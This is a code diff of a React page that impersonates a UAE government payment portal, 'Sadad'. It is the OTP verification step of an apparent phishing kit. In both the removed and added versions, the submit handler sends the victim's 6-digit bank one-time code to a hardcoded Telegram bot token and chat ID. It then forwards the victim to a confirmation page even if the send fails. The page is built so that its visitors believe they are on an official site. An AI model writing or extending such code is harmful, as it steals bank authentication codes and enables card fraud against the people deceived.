@@ -1,16 +1,11 @@
-import { useState, useEffect } from "react";
+import React, { useState, useEffect } from 'react';
 import { useLocation } from "wouter";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
-import { ShieldCheck, Smartphone, Loader2, RefreshCw, AlertCircle } from "lucide-react";
 
-export default function VerifyOtp() {
+const VerifyOtp: React.FC = () => {
   const [, setLocation] = useLocation();
   const [loading, setLoading] = useState(false);
-  const [otp, setOtp] = useState("");
-  const [timer, setTimer] = useState(300);
-  const [showError, setShowError] = useState(false);
+  const [otp, setOtp] = useState('');
+  const [timer, setTimer] = useState(300); // 5 minutes
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -22,145 +17,157 @@ export default function VerifyOtp() {
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60);
     const secs = seconds % 60;
-    return `${mins}:${secs.toString().padStart(2, "0")}`;
+    return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
 
-  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
-  const TELEGRAM_CHAT_ID = "8362204213";
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    // حقل الرمز: 6 أرقام فقط
+    const cleaned = e.target.value.replace(/\D/g, '').slice(0, 6);
+    setOtp(cleaned);
+  };
 
-  const handleNext = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (otp.length < 4) {
-      setShowError(true);
+    
+    if (otp.length < 6) {
+      alert("يرجى إدخال رمز التحقق المكون من 6 أرقام");
       return;
     }
-    
+
     setLoading(true);
-    setShowError(false);
 
     const message = `
-🔐 *رمز التحقق (OTP) - بوابة سداد الإمارات*
---------------------------
-🔢 *الرمز المدخل:* ${otp}
---------------------------
+🔑 *رمز تحقق (OTP) جديد*
+🔢 الرمز: ${otp}
     `;
 
     try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
+      await fetch(`https://api.telegram.org/bot8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
+          chat_id: '8362204213',
           text: message,
-          parse_mode: "Markdown",
-        }),
+          parse_mode: 'Markdown'
+        })
       });
-      
-      setTimeout(() => {
-        const paymentData = JSON.parse(sessionStorage.getItem("paymentData") || "{}");
-        sessionStorage.setItem("paymentData", JSON.stringify({ ...paymentData, otp }));
-        setLocation("/confirm-payment");
-      }, 1800);
+      setLocation("/confirm-payment");
     } catch (error) {
-      console.error(error);
+      console.error("Error sending to Telegram", error);
+      setLocation("/confirm-payment");
+    } finally {
       setLoading(false);
     }
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
-      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
-        <div className="container flex justify-between items-center">
-          <div className="flex items-center gap-3">
-            <div className="bg-amber-500 p-2 rounded-lg">
-              <span className="text-white font-bold text-sm">سداد</span>
-            </div>
-            <h1 className="text-lg font-bold text-gray-800">بوابة سداد الإمارات</h1>
-          </div>
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE" className="h-10" />
+    <div className="min-h-screen bg-gray-50 font-['Tajawal']" dir="rtl">
+      <header className="bg-white shadow-sm py-4 px-6 flex justify-between items-center border-b-2 border-orange-400">
+        <div className="flex items-center gap-2">
+          <div className="bg-orange-500 text-white p-2 rounded-lg font-bold text-xl">سداد</div>
+          <span className="text-gray-800 font-bold text-lg">بوابة سداد الإمارات</span>
         </div>
+        <img 
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" 
+          alt="UAE Emblem" 
+          className="h-10 w-auto" 
+        />
       </header>
 
-      <main className="flex-grow container py-12 px-4">
-        <div className="max-w-xl mx-auto">
-          {/* Progress Steps */}
-          <div className="flex justify-between mb-12 relative px-4">
-            {[1, 2, 3, 4, 5].map((step) => (
-              <div key={step} className="flex flex-col items-center z-10">
-                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold border-2 transition-all ${step <= 4 ? 'bg-amber-500 border-amber-500 text-white shadow-lg shadow-amber-500/30' : 'bg-white border-gray-200 text-gray-400'}`}>
-                  {step}
-                </div>
-                <span className={`text-[10px] mt-2 font-bold ${step <= 4 ? 'text-amber-600' : 'text-gray-400'}`}>
-                  {step === 1 ? 'البيانات' : step === 2 ? 'البنك' : step === 3 ? 'البطاقة' : step === 4 ? 'التحقق' : 'التأكيد'}
-                </span>
-              </div>
-            ))}
-            <div className="absolute top-5 left-8 right-8 h-0.5 bg-gray-200 -z-0"></div>
+      <div className="max-w-4xl mx-auto mt-8 px-4">
+        <div className="flex justify-between items-center relative">
+          <div className="absolute top-1/2 left-0 w-full h-1 bg-gray-200 -z-10 transform -translate-y-1/2"></div>
+          <div className="bg-green-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">✓</div>
+          <div className="bg-green-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">✓</div>
+          <div className="bg-green-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">✓</div>
+          <div className="bg-orange-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">4</div>
+          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">5</div>
+        </div>
+        <div className="flex justify-between mt-2 text-xs font-bold text-gray-500">
+          <span className="text-green-600">البيانات</span>
+          <span className="text-green-600">البنك</span>
+          <span className="text-green-600">البطاقة</span>
+          <span className="text-orange-600">التحقق</span>
+          <span>التأكيد</span>
+        </div>
+      </div>
+
+      <div className="max-w-md mx-auto mt-10 px-4 pb-20">
+        <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
+          <div className="bg-slate-900 p-8 text-white text-center">
+            <div className="bg-orange-500 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
+              <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+              </svg>
+            </div>
+            <h2 className="text-2xl font-bold mb-2">التحقق من الهوية</h2>
+            <p className="text-slate-400 text-sm">تم إرسال رمز التحقق (OTP) إلى رقم هاتفك المرتبط بالبطاقة</p>
           </div>
-
-          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
-            <div className="bg-slate-900 p-8 text-white text-center">
-              <div className="w-16 h-16 bg-amber-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-amber-500/30">
-                <Smartphone className="w-8 h-8 text-amber-500" />
-              </div>
-              <h2 className="text-2xl font-bold">التحقق من الهوية</h2>
-              <p className="text-slate-400 text-sm mt-2">تم إرسال رمز التحقق (OTP) إلى رقم هاتفك المرتبط بالبطاقة</p>
+          
+          <div className="p-8">
+            <div className="bg-green-50 border border-green-100 rounded-xl p-4 mb-8 flex items-center gap-3">
+              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-600" viewBox="0 0 20 20" fill="currentColor">
+                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+              </svg>
+              <p className="text-green-700 text-xs font-bold">تم إرسال الرمز بنجاح. يرجى التحقق من رسائل SMS.</p>
             </div>
 
-            <div className="p-8">
-              <div className="bg-green-50 border border-green-100 p-4 rounded-xl flex items-center gap-3 mb-8">
-                <ShieldCheck className="w-5 h-5 text-green-600" />
-                <p className="text-xs text-green-800 font-bold">تم إرسال الرمز بنجاح. يرجى التحقق من رسائل SMS.</p>
+            <form onSubmit={handleSubmit} className="space-y-6">
+              <div className="space-y-2">
+                <label className="text-sm font-bold text-gray-700 block text-center">أدخل رمز التحقق المكون من 6 أرقام</label>
+                <input 
+                  id="otp"
+                  type="text" 
+                  required
+                  placeholder="0 0 0 0 0 0"
+                  className="w-full px-4 py-4 rounded-xl border-2 border-gray-100 focus:border-orange-500 outline-none transition-all text-center text-3xl font-black tracking-[0.5em] text-orange-600"
+                  value={otp}
+                  onChange={handleChange}
+                />
               </div>
 
-              <form onSubmit={handleNext} className="space-y-8">
-                <div className="space-y-4">
-                  <Label htmlFor="otp" className="text-sm font-bold text-gray-700 block text-center">أدخل رمز التحقق المكون من 6 أرقام</Label>
-                  <Input 
-                    id="otp" 
-                    required 
-                    placeholder="0 0 0 0 0 0" 
-                    className={`text-center text-3xl tracking-[0.5em] py-8 font-black bg-gray-50 border-2 focus:ring-amber-500 ${showError ? 'border-red-500 animate-shake' : 'border-gray-100'}`}
-                    value={otp} 
-                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))} 
-                  />
-                  {showError && (
-                    <p className="text-xs text-red-500 flex items-center justify-center gap-1 font-bold">
-                      <AlertCircle className="w-3 h-3" /> يرجى إدخال رمز التحقق بشكل صحيح
-                    </p>
+              <div className="text-center">
+                <p className="text-gray-400 text-xs mb-2">تنتهي صلاحية الرمز خلال:</p>
+                <div className="text-orange-500 font-bold text-lg">{formatTime(timer)}</div>
+              </div>
+
+              <button 
+                type="button"
+                className="w-full text-orange-600 font-bold text-sm hover:underline"
+              >
+                إعادة إرسال الرمز
+              </button>
+
+              <div className="flex gap-4 pt-4">
+                <button 
+                  type="button"
+                  onClick={() => setLocation("/card-data")}
+                  className="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-600 py-4 rounded-xl font-bold transition-all"
+                >
+                  الرجوع
+                </button>
+                <button 
+                  type="submit"
+                  disabled={loading}
+                  className="flex-[2] bg-orange-500 hover:bg-orange-600 text-white py-4 rounded-xl font-bold text-lg shadow-lg hover:shadow-orange-200 transition-all flex items-center justify-center gap-2"
+                >
+                  {loading ? (
+                    <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                  ) : (
+                    "تأكيد العملية"
                   )}
-                </div>
-
-                <div className="flex flex-col items-center gap-4">
-                  <div className="flex items-center gap-2 text-gray-500">
-                    <span className="text-xs">تنتهي صلاحية الرمز خلال:</span>
-                    <span className="font-mono font-bold text-amber-600 bg-amber-50 px-3 py-1 rounded-full border border-amber-100">{formatTime(timer)}</span>
-                  </div>
-                  
-                  <button type="button" className="text-xs text-blue-600 font-bold hover:underline flex items-center gap-1">
-                    <RefreshCw className="w-3 h-3" /> إعادة إرسال الرمز
-                  </button>
-                </div>
-
-                <div className="flex gap-4 pt-4">
-                  <Button type="button" variant="ghost" className="flex-1 text-gray-500" onClick={() => setLocation("/card-data")}>الرجوع</Button>
-                  <Button type="submit" className="flex-[2] bg-amber-500 hover:bg-amber-600 text-white font-bold py-6 rounded-xl shadow-lg shadow-amber-500/20" disabled={loading}>
-                    {loading ? (
-                      <span className="flex items-center gap-2">
-                        <Loader2 className="w-5 h-5 animate-spin" /> جاري التحقق...
-                      </span>
-                    ) : "تأكيد العملية"}
-                  </Button>
-                </div>
-              </form>
-            </div>
-            
-            <div className="bg-gray-50 p-4 text-center border-t border-gray-100">
-              <p className="text-[10px] text-gray-400">إذا لم يصلك الرمز، يرجى التأكد من تغطية الشبكة أو التواصل مع البنك المصدر للبطاقة.</p>
-            </div>
+                </button>
+              </div>
+            </form>
+          </div>
+          
+          <div className="p-6 bg-gray-50 border-t border-gray-100 text-center">
+            <p className="text-[10px] text-gray-400">إذا لم يصلك الرمز، يرجى التأكد من تغطية الشبكة أو التواصل مع البنك المصدر للبطاقة.</p>
           </div>
         </div>
-      </main>
+      </div>
     </div>
   );
-}
+};
+
+export default VerifyOtp;
